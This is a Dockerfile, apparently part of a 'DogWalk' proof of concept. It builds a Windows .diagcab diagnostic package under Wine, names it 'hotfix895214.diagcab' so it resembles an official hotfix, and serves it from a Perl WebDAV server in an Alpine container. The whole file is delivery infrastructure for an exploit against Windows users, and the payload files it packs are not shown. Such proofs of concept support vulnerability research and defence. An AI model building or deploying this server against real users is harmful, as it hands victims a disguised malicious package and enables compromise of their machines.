# syntax=docker/dockerfile:1
FROM scottyhardy/docker-wine:latest AS builder
COPY . /run/dogwalk-build
WORKDIR /run/dogwalk-build

# Build .diagcab file
RUN wine ./utils/cabarc.exe n hotfix895214.diagcab custom.diagcfg 
# RUN mv ./hotfix895214.diagcab ./tmp

# Run perl server
FROM alpine:latest
ADD ./webdav/diagcab-webdav-poc /run/dogwalk-poc
COPY --from=builder /run/dogwalk-build/hotfix895214.diagcab /run/dogwalk-poc/config/hotfix895214.diagcab
RUN apk update && apk add perl
WORKDIR /run/dogwalk-poc

CMD ./diagcab-webdav-poc.pl
